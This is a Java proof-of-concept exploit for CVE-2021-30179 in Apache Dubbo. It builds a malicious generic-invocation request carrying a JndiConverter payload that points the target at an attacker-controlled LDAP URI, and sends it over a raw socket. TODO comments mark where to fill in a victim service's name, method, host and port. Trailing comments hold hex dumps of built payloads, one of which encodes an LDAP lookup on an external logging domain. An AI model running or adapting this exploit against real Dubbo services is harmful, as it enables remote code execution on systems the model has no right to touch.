package com.arliya.dubbo.main;

import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;


import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;


/**
 * 漏洞编号:
 *      CVE-2021-30179
 * 适用版本:
 *      Apache Dubbo 2.7.0 to 2.7.9
 *      Apache Dubbo 2.6.0 to 2.6.9
 *      Apache Dubbo all 2.5.x versions
 */
public class CVE202130179 {
    public static void main(String[] args) throws Exception{

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        // set body
        out.writeUTF("2.7.8");
        //todo 此处填写Dubbo提供的服务名
        out.writeUTF("com.arliya.dubbo.api.Person");
        //服务版本
        out.writeUTF("");
        //方法名
        out.writeUTF("$invoke");
        //描述
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        //todo 此处填写Dubbo提供的服务的方法
        //方法名
        out.writeUTF("sayHello");
        // 方法参数类型
        out.writeObject(new String[] {"java.lang.String"});

        // POC 1: raw.return
//        getRawReturnPayload(out, "ldap://127.0.0.1:8087/Exploit");

        // POC 2: bean
        getBeanPayload(out, "ldap://127.0.0.1:8888/#Foo");

        // POC 3: nativejava
//        getNativeJavaPayload(out, "src\\main\\java\\top\\lz2y\\1.ser");

        out.flushBuffer();

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();
        System.out.println(byteArrayOutputStream.toString());
        StringBuilder stringBuilder = new StringBuilder();
        for (Byte b: bytes){
            stringBuilder.append(String.format("%02x", b));
        }
        System.out.println(stringBuilder);

        //todo 此处填写Dubbo服务地址及端口
        Socket socket = new Socket("localhost", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }

    private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getBeanPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter",7);
        javaBeanDescriptor.setProperty("asText",ldapUri);
        out.writeObject(new Object[]{javaBeanDescriptor});
        HashMap map = new HashMap();

        map.put("generic", "bean");
        out.writeObject(map);
    }

    private static void getNativeJavaPayload(Hessian2ObjectOutput out, String serPath) throws IOException {
        byte[] payload = FileUtils.getBytesByFile(serPath);
        out.writeObject(new Object[] {payload});

        HashMap map = new HashMap();
        map.put("generic", "nativejava");
        out.writeObject(map);
    }
}

//dabb 82 00 000000000494e957 0000015e 05322e372e381b 636f6d2e61726c6979612e647562626f2e6170692e506572736f6e 000724696e766f6b6530384c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f4f626a6563743b 08 73617948656c6c6f 71 07 5b737472696e67 10 6a6176612e6c616e672e537472696e67 7107 5b6f626a656374 43 3033 6f72672e6170616368652e647562626f2e636f6d6d6f6e2e6265616e7574696c2e4a6176614265616e44657363726970746f72930a70726f70657274696573047479706509636c6173734e616d65604d176a6176612e7574696c2e4c696e6b6564486173684d617006617354657874 1a 6c6461703a2f2f3132372e302e302e313a383838382f23466f6f 5a97302d6f72672e6170616368652e786265616e2e70726f7065727479656469746f722e4a6e6469436f6e766572746572480767656e65726963046265616e5a
//dabb 82 00 0000000002d422d0 00000160 05322e372e381c 636f6d2e61726c6979612e647562626f2e6170692e506572736f6e31 000724696e766f6b6530384c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f4f626a6563743b 09 73617948656c6c6f31 71 07 5b737472696e67 10 6a6176612e6c616e672e537472696e67 71075b6f626a6563744330336f72672e6170616368652e647562626f2e636f6d6d6f6e2e6265616e7574696c2e4a6176614265616e44657363726970746f72930a70726f70657274696573047479706509636c6173734e616d65604d176a6176612e7574696c2e4c696e6b6564486173684d617006617354657874 1a 6c6461703a2f2f3132372e302e302e313a383838382f23466f6f 5a97302d6f72672e6170616368652e786265616e2e70726f7065727479656469746f722e4a6e6469436f6e766572746572480767656e65726963046265616e5a
//dabb 82 00 000000000014a90b 0000016e 05322e372e381b 636f6d2e61726c6979612e647562626f2e6170692e5363686f6f6c 000724696e766f6b6530384c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f4f626a6563743b 07 6765744e616d65 71 07 5b737472696e67 10 6a6176612e6c616e672e537472696e67 71075b6f626a6563744330336f72672e6170616368652e647562626f2e636f6d6d6f6e2e6265616e7574696c2e4a6176614265616e44657363726970746f72930a70726f70657274696573047479706509636c6173734e616d65604d176a6176612e7574696c2e4c696e6b6564486173684d617006617354657874 302a 6c6461703a2f2f3666696c6a6c77742e646e732e39623535303161332e617873732e78797a2f23466f6f 5a97302d6f72672e6170616368652e786265616e2e70726f7065727479656469746f722e4a6e6469436f6e766572746572480767656e65726963046265616e5a